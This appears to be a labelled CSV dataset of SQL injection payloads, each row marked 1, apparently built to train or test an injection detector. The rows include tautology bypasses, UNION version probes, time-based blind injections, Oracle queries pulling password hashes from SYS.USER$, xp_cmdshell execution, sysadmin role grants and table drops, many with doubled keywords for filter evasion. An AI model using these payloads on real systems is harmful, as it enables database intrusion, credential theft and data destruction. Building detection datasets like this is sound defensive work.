Query,Label
" sselectelect * frfromom users whwhereere id  =  11<1# uniunionon sselectelect 1,version  (    )   -- 1",1
   )    )    oorr    (    (   'x'   )    )     =     (    (   'x,1
" seselectlect * ffromrom users whwhereere id  =  '1' oorr \.<1 uunionnion seselectlect 1,@@VERSION -- 1'",1
" seleselectct * ffromrom users wwherehere id  =  '1' <@&1 uunionnion seleselectct 1,version  (    )   -- 1'",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  ttableable_name  )   frofromm   (  selselectect DiissTiinnCT  (  ttableable_name  )  , ROWNUM AS limlimitit frofromm sys.all_ttableables  )   whwhereere limlimitit  =  4   )    )    anandd 'i'  =  'i",1
; if iiss_srvrolemember  (  'sysadmiinn'  )   > 0 waitfoorr delay '0:0:2' --,1
selselectect * frfromom users whewherere id  =  1 <@<@ oorr 1  =  1 -- 1,1
" sselectelect * frfromom users wwherehere id  =  1 uunionnion sselectelect @<@$,version  (    )   -- 1",1
" sselectelect * frofromm users whewherere id  =  '1' <@<@ uunionnion sselectelect 1,version  (    )   -- 1'",1
" selselectect * frfromom users wwherehere id  =  1 oorr ""$_"" oorr 1  =  1 -- 1",1
" selselectect * frfromom users whwhereere id  =  1 oorr 1#""{ ununionion selselectect version  (    )  ,version  (    )   -- 1",1
a' oorr 1  =  1--,1
 )   oorr   (  a  =  a,1
"""   )    )    oorr    (    (   ""x""   )    )     =     (    (   ""x",1
" seselectlect * ffromrom users whewherere id  =  1 oorr 1#""; oorr 1  =  1 -- 1",1
" selselectect * frfromom users whewherere id  =  '1' <@$_ ununionion selselectect 1,version  (    )   -- 1'",1
-- &passwoorrd  = ,1
seselectlect * ffromrom users whwhereere id  =  1 <@. oorr 1  =  1 -- 1,1
" selselectect * frofromm users wherwheree id  =  1 oorr ""  (    )  "" oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users wherwheree id  =  1 %$ 1 uniunionon selecselectt nulnulll,@@VERSION -- 1",1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  granted_role  )   ffromrom   (  seleselectct DiissTiinnCT  (  granted_role  )  , ROWNUM AS limilimitt ffromrom dba_role_privs whewherere GRANTEE  =  SYS.LOGiinnUSER  )   whewherere limilimitt  =  3   )    )    aandnd 'i'  =  'i",1
 oorr '1'  =  '1,1
admiinn' oorr 1  =  1,1
" seselectlect * ffromrom users wherwheree id  =  1 oorr "";,""  =  1 oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users wwherehere id  =  1 uniunionon selecselectt @||1,version  (    )   -- 1",1
" seleselectct * frfromom users whwhereere id  =  1 +\+. ununionion seleselectct nulnulll,@@VERSION -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr ""  )  ,"" oorr 1  =  1 -- 1",1
" uniounionn selselectect * frofromm users wherwheree logiinn   =   char  (  114,111,111,116  )  ;",1
" seselectlect * frfromom users whewherere id  =  1 oorr 1#""? uniunionon seselectlect 1,version  (    )   -- 1",1
 oorr 1  =  1--,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  granted_role  )   ffromrom   (  seleselectct DiissTiinnCT  (  granted_role  )  , ROWNUM AS llimitimit ffromrom dba_role_privs wherwheree GRANTEE  =  SYS.LOGiinnUSER  )   wherwheree llimitimit  =  5   )    )    anandd 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ oorr 3  =  3 --,1
" seselectlect * ffromrom users whewherere id  =  1 -1<@ uunionnion seselectlect 1,version  (    )   -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 oorr ""$#"" oorr 1  =  1 -- 1",1
 )   uunionnion selselectect * frfromom iinnfoorrmation_schema.tabltablees;,1
" sselectelect * ffromrom users wwherehere id  =  1 oorr ""  )  ]"" oorr 1  =  1 -- 1",1
"  )   oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
 anandd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt COUNT  (  DiissTiinnCT  (  column_name   )    )    frfromom sys.all_tab_columns   )    )    anandd 'i'  =  'i,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  tabtablele_name  )   frfromom   (  selselectect DiissTiinnCT  (  tabtablele_name  )  , ROWNUM AS lilimitmit frfromom sys.all_tabtableles  )   whewherere lilimitmit  =  7   )    )    aandnd 'i'  =  'i",1
""" oorr """" """,1
dedeletelete,1
;waitfoorr delay '0:0:__TIME__'--,1
 oorr 1  =  1 --,1
1' anandd non_exiisstant_ttableable   =   '1,1
" selecselectt * frofromm users whewherere id  =  1 oorr ""&  )  "" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  '1' + $ . uniunionon seleselectct 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   seleselectct @s   =   0x77616974 ...,1
x' aandnd userid iiss nnullull; --,1
" seleselectct * frofromm users whewherere id  =  1 oorr "";["" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  '1' oorr \.<   =  1 uniounionn seleselectct 1,@@VERSION -- 1'",1
" sselectelect * frofromm users wherwheree id  =  1 uniunionon sselectelect @<@,version  (    )   -- 1",1
" sselectelect * frofromm users whwhereere id  =  1 -@<@ uniunionon sselectelect 1,version  (    )   -- 1",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct host_name ffromrom v$iinnstance   )    )    aandnd 'i'  =  'i,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  column_name  )   frfromom   (  selselectect DiissTiinnCT  (  column_name  )  , ROWNUM AS lilimitmit frfromom all_tab_columns  )   whewherere lilimitmit  =  2   )    )    aandnd 'i'  =  'i",1
selselectect * frofromm users whwhereere id  =  1 +   (  \+  )   oorr 1  =  1 -- 1,1
" seleselectct * frfromom users whewherere id  =  1 oorr "".["" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users whewherere id  =  1 oorr ""  (  ["" oorr 1  =  1 -- 1",1
uunionnion ALL sselectelect,1
" sselectelect * ffromrom users wherwheree id  =  1 oorr ""1#"" oorr 1  =  1 -- 1",1
selecselectt * frfromom users whewherere id  =  1 oorr \<1 oorr 1  =  1 -- 1,1
" seselectlect * ffromrom users whewherere id  =  1 | |1 uniunionon seselectlect 1,banner ffromrom v$version whewherere rownum  =  1 -- 1",1
x' oorr full_name llikeike '%bob%,1
x' anandd members.email iiss nnullull; --,1
 oorr 2 > 1,1
seselectlect * frfromom users wherwheree id  =  1.*1 oorr 1  =  1 -- 1,1
"""  )   oorr pg_sleep  (  __TIME__  )  --",1
 ',1
" seselectlect * frofromm users whewherere id  =  1 oorr $<\. uniounionn seselectlect 1,@@VERSION -- 1",1
" selecselectt * frofromm users wwherehere id  =  1 oorr ""@  )  "" oorr 1  =  1 -- 1",1
selecselectt * frfromom users wherwheree id  =  1 oorr \.<$ oorr 1  =  1 -- 1,1
 )   oorr sleep  (  __TIME__  )    =  ',1
sleep 50',1
" seselectlect * frofromm users whewherere id  =  '1' + 1||1 uunionnion seselectlect 1,banner frofromm v$version whewherere rownum  =  1 -- 1'",1
sselectelect * frfromom users whewherere id  =  1 + $+%\ oorr 1  =  1 -- 1,1
" selecselectt * frofromm users wwherehere id  =  1 oorr "";  (  "" oorr 1  =  1 -- 1",1
oorr sleep  (  __TIME__  )    =  ',1
" selselectect * ffromrom users wherwheree id  =  1 oorr "";_"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users whwhereere id  =  1 oorr 1#"". uunionnion seleselectct 1,version  (    )   -- 1",1
" seleselectct * ffromrom users whewherere id  =  1 ununionion seleselectct  @ $,version  (    )   -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 uniunionon seleselectct +!<@,version  (    )   -- 1",1
" selselectect * frofromm users wherwheree id  =  1 <@<@ ununionion selselectect nnullull,version  (    )   -- 1",1
oorr 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythiinng' oorr 'x'  =  'x,1
" selselectect * frofromm users wherwheree id  =  1 oorr \<\ uniunionon selselectect 1,@@VERSION -- 1",1
" sselectelect * frofromm users whwhereere id  =  1 uunionnion sselectelect   (  1  )  ,banner frofromm v$version whwhereere rownum  =  1 -- 1",1
" seleselectct * frfromom users whewherere id  =  1 *  (  \  )   ununionion seleselectct nunullll,@@VERSION -- 1",1
&',1
a' oorr 3  =  3--,1
" selselectect * ffromrom users whewherere id  =  '1' oorr $+<$ uniounionn selselectect 1,@@VERSION -- 1'",1
" seselectlect * frofromm users whewherere id  =  1 +1 uniunionon seselectlect 1,banner frofromm v$version whewherere rownum  =  1 -- 1",1
"admiinn""oorr 1  =  1 oorr """"  =  """,1
uni/**/on sel/**/ect,1
""" oorr """"&""",1
 )    )   ;waitfoorr delay '0:0:__TIME__'--,1
" selselectect * ffromrom users wwherehere id  =  1 oorr ""?;"" oorr 1  =  1 -- 1",1
1 waitfoorr delay '0:0:10'--,1
bfilename,1
admiinn'  )   oorr   (  '1'  =  '1'--,1
UEf,1
 -- &passwoorrd  = ,1
1 oorr sleep  (  __TIME__  )  #,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  ttableable_name  )   frfromom   (  selecselectt DiissTiinnCT  (  ttableable_name  )  , ROWNUM AS lilimitmit frfromom sys.all_ttableables  )   whewherere lilimitmit  =  6   )    )    anandd 'i'  =  'i",1
" selselectect * frfromom users whewherere id  =  '1' uniounionn selselectect $[""],@@VERSION -- 1'",1
" sselectelect * ffromrom users whwhereere id  =  '1' + @  (  1  )   uunionnion sselectelect 1,version  (    )   -- 1'",1
1' aandnd 1  =    (  seleselectct count  (  *  )   frofromm ttableablenames  )  ; --,1
oorr sleep  (  __TIME__  )  #,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  granted_role  )   frfromom   (  seselectlect DiissTiinnCT  (  granted_role  )  , ROWNUM AS lilimitmit frfromom dba_role_privs whwhereere GRANTEE  =  SYS.LOGiinnUSER  )   whwhereere lilimitmit  =  8   )    )    anandd 'i'  =  'i",1
" seselectlect * frofromm users wherwheree id  =  1 oorr 1#"",  =  1 oorr 1  =  1 -- 1",1
||6,1
oorr 1/*,1
" aandnd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
sselectelect * ffromrom users wwherehere id  =  1.%@ oorr 1  =  1 -- 1,1
" seleselectct * frfromom users wherwheree id  =  1 oorr ""..""  =  1 oorr 1  =  1 -- 1",1
" seselectlect * frofromm users whewherere id  =  1 oorr 1&@#  =  1 uniunionon seselectlect 1,version  (    )   -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr "";]"" oorr 1  =  1 -- 1",1
" oorr 1  =  1 oorr """"  =  ",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect DiissTiinnCT  (  PASSWoorrD  )   ffromrom   (  selselectect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit ffromrom SYS.USER$  )   whwhereere lilimitmit  =  7   )    )    anandd 'i'  =  'i",1
sselectelect * ffromrom users wwherehere id  =  1 oorr $<\. oorr 1  =  1 -- 1,1
" seleselectct * frfromom users whewherere id  =  1 *  (  1  )   ununionion seleselectct 1,banner frfromom v$version whewherere rownum  =  1 -- 1",1
oorr 'whatever' iinn   (  'whatever'  ) ,1
declare @s varchar   (  200  )   sselectelect @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
selselectect * ffromrom users whwhereere id  =  '1'   oorr 1  =  1 -- 1',1
?,1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selselectect COUNT  (  DiissTiinnCT  (  tabtablele_name   )    )    frfromom sys.all_tabtableles   )    )    aandnd 'i'  =  'i,1
" seleselectct * frfromom users wwherehere id  =  '1' uunionnion seleselectct @ 1,version  (    )   --  1'",1
"admiinn""  )   oorr   (  ""1""  =  ""1""#",1
" selecselectt * ffromrom users wwherehere id  =  1 oorr 1#"", uniounionn selecselectt 'a',version  (    )   -- 1",1
" seleselectct * ffromrom users wwherehere id  =  1 oorr ""$  (  "" oorr 1  =  1 -- 1",1
 oorr '' ',1
" selecselectt * ffromrom users whwhereere id  =  1 oorr "";#"" oorr 1  =  1 -- 1",1
oorr 1  =  1,1
 ; drdropop tatableble temp --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  sselectelect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit frofromm SYS.USER$  )   whwhereere lilimitmit  =  2   )    )    aandnd 'i'  =  'i",1
""" oorr benchmark  (  10000000,MD5  (  1   )    )   #",1
""" oorr ""x""  =  ""x",1
selselectect * ffromrom users whwhereere id  =  '1'<@.. oorr 1  =  1 -- 1',1
" selecselectt * frofromm users wherwheree id  =  1 oorr !<@ uniounionn selecselectt 1,version  (    )   -- 1",1
 oorr 'somethiinng' lilikeke 'some%',1
; if nonott   (    (   sselectelect serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 0  )   waitfoorr delay '0:0:2' --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  PASSWoorrD  )   frfromom   (  seleselectct DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit frfromom SYS.USER$  )   whewherere lilimitmit  =  4   )    )    anandd 'i'  =  'i",1
selecselectt * frfromom users whewherere id  =  '1' oorr \<\. oorr 1  =  1 -- 1',1
; exec master..xp_cmdshell 'piinng 10.10.1.2'--,1
admiinn' oorr '1'  =  '1'--,1
; if nnotot   (    (   seselectlect serverproperty  (  'iissiinntegratedsecurityonly'   )    )    <> 1  )   waitfoorr delay '0:0:2' --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  ttableable_name  )   frofromm   (  seleselectct DiissTiinnCT  (  ttableable_name  )  , ROWNUM AS limilimitt frofromm sys.all_ttableables  )   whwhereere limilimitt  =  2   )    )    aandnd 'i'  =  'i",1
" selecselectt * ffromrom users whewherere id  =  1 <@<@ uniunionon selecselectt version  (    )  ,version  (    )   -- 1",1
" selecselectt * frfromom users whewherere id  =  1 oorr 1#""$ ununionion selecselectt nunullll,version  (    )   -- 1",1
""";waitfoorr delay '0:0:__TIME__'--",1
x' aandnd userid iiss nunullll; --,1
sselectelect * frfromom users wwherehere id  =  '1' *$ 1 oorr 1  =  1 -- 1',1
" sselectelect * frofromm users wherwheree id  =  1 oorr \<\ uunionnion sselectelect nunullll,@@VERSION -- 1",1
" selselectect * ffromrom users whewherere id  =  1 oorr ""?@"" oorr 1  =  1 -- 1",1
’ oorr ‘1’  =  ’1,1
" seselectlect * frofromm users whewherere id  =  '1' uunionnion seselectlect 1a,banner frofromm v$version whewherere rownum  =  1 -- 1'",1
admiinn'oorr 1  =  1 oorr ''  =  ',1
" seselectlect * ffromrom users wwherehere id  =  '1' oorr !<1 ununionion seselectlect 1,version  (    )   -- 1'",1
" anandd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" seleselectct * ffromrom users wwherehere id  =  1 oorr ""_  )  "" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users whewherere id  =  1 oorr \.<   =  1 uunionnion seleselectct 1,@@VERSION -- 1",1
 oorr 1  =  1,1
sselectelect * frofromm users wherwheree id  =  1 + $+%1 oorr 1  =  1 -- 1,1
" seselectlect * frfromom users whewherere id  =  1.  uniunionon seselectlect version  (    )  ,version  (    )   -- 1",1
x' anandd email iiss nnullull; --,1
" seleselectct * frfromom users whwhereere id  =  '1' + @ @1 ununionion seleselectct 1,version  (    )   -- 1'",1
 --,1
" selecselectt * ffromrom users whwhereere id  =  '1'   uniounionn selecselectt nnullull,banner ffromrom v$version whwhereere rownum  =  1 -- 1'",1
" seleselectct * frfromom users whewherere id  =  11||1 uniounionn seleselectct 1,banner frfromom v$version whewherere rownum  =  1 -- 1",1
" seselectlect * ffromrom users wherwheree id  =  1.*1 uniunionon seselectlect 1,banner ffromrom v$version wherwheree rownum  =  1 -- 1",1
upupdatedate,1
 oorr 1/*,1
" sselectelect * frofromm users whwhereere id  =  1.<1# ununionion sselectelect 1,version  (    )   -- 1",1
"""   )    )    oorr pg_sleep  (  __TIME__  )  --",1
||'6,1
" sselectelect * ffromrom users whewherere id  =  1. <@ ununionion sselectelect 1,version  (    )   -- 1",1
oorr   (  EXiissTS  ) ,1
^',1
oorr 'text'   =   n'text',1
" selecselectt * ffromrom users whwhereere id  =  1 + \+*$ uunionnion selecselectt nnullull,@@VERSION -- 1",1
" selselectect * ffromrom users wherwheree id  =  '1' uniunionon selselectect $ _,@@VERSION -- 1'",1
" selecselectt * frofromm users whwhereere id  =  1 oorr ""  )  ;"" oorr 1  =  1 -- 1",1
" selselectect * ffromrom users whwhereere id  =  1 <@1$ uniunionon selselectect 1,version  (    )   -- 1",1
 oorr 0  =  0 --,1
" seselectlect * frofromm users whewherere id  =  1 oorr ""{1""  =  1 oorr 1  =  1 -- 1",1
" seselectlect * frofromm users whwhereere id  =  1 oorr ""{,""  =  1 oorr 1  =  1 -- 1",1
" selecselectt * frfromom users wwherehere id  =  1 oorr 1#"", ununionion selecselectt version  (    )  ,version  (    )   -- 1",1
" selselectect * frofromm users wwherehere id  =  1 oorr 1#""? uniunionon selselectect 'a',version  (    )   -- 1",1
passwoorrd:*/  =  1--,1
" seleselectct * ffromrom users whewherere id  =  1 <@. uniounionn seleselectct 1,version  (    )   -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 oorr ""  )  @"" oorr 1  =  1 -- 1",1
" seleselectct * ffromrom users wherwheree id  =  '1' uniunionon seleselectct @ @1,version  (    )   --  1'",1
" uunionnion   (  sselectelect nulnulll,   (  sselectelect @@version   )    )    --",1
" seselectlect * frfromom users wwherehere id  =  1 oorr ""  )  {"" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users whewherere id  =  1.<@. uniunionon seleselectct 1,version  (    )   -- 1",1
" selselectect * ffromrom users whewherere id  =  1 +\. uniunionon selselectect nulnulll,@@VERSION -- 1",1
" selecselectt * ffromrom users whewherere id  =  1 + @<@. uniounionn selecselectt 1,version  (    )   -- 1",1
" seselectlect * frofromm users wherwheree id  =  1 oorr \<$ uniounionn seselectlect 1,@@VERSION -- 1",1
" seselectlect * frofromm users whewherere id  =  1 oorr   (  $+  )    =  1 ununionion seselectlect 1,@@VERSION -- 1",1
" seselectlect * frofromm users whwhereere id  =  1 +   (  \+  )   uunionnion seselectlect nunullll,@@VERSION -- 1",1
" seleselectct * frofromm users wwherehere id  =  1. uunionnion seleselectct nulnulll,version  (    )   -- 1",1
" sselectelect * ffromrom users wherwheree id  =  1 oorr ""  )  ["" oorr 1  =  1 -- 1",1
" selselectect * frfromom users wherwheree id  =  1 oorr \.<1 uniunionon selselectect 1,@@VERSION -- 1",1
 aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt banner frofromm v$version wherwheree ROWNUM  =  1   )    )    aandnd 'i'  =  'i,1
sselectelect * ffromrom users wherwheree id  =  1 <@$_ oorr 1  =  1 -- 1,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  column_name  )   frfromom   (  seselectlect DiissTiinnCT  (  column_name  )  , ROWNUM AS limlimitit frfromom all_tab_columns  )   whewherere limlimitit  =  3   )    )    anandd 'i'  =  'i",1
" seselectlect * frofromm users whewherere id  =  1 oorr $+<$ uniunionon seselectlect 1,@@VERSION -- 1",1
" seselectlect * ffromrom users whewherere id  =  1 oorr ""@%"" oorr 1  =  1 -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 oorr $<\ uniounionn seleselectct 1,@@VERSION -- 1",1
" sselectelect * ffromrom users whwhereere id  =  1 oorr ""%,"" oorr 1  =  1 -- 1",1
uniounionn seselectlect,1
aascsc,1
" || myappadmiinn.adduser  (  'admiinn', 'newpass'  )   || '",1
"exec sp_addsrvrolemember 'name' , 'sysadmiinn'",1
" selselectect * frofromm users whwhereere id  =  1 oorr   (  \  )    =  1 uniunionon selselectect 1,@@VERSION -- 1",1
  )   oorr true--,1
" seleselectct * ffromrom users whewherere id  =  1 +  (  1  )   ununionion seleselectct 1,banner ffromrom v$version whewherere rownum  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   sselectelect DiissTiinnCT  (  PASSWoorrD  )   frofromm   (  sselectelect DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS lilimitmit frofromm SYS.USER$  )   wherwheree lilimitmit  =  3   )    )    anandd 'i'  =  'i",1
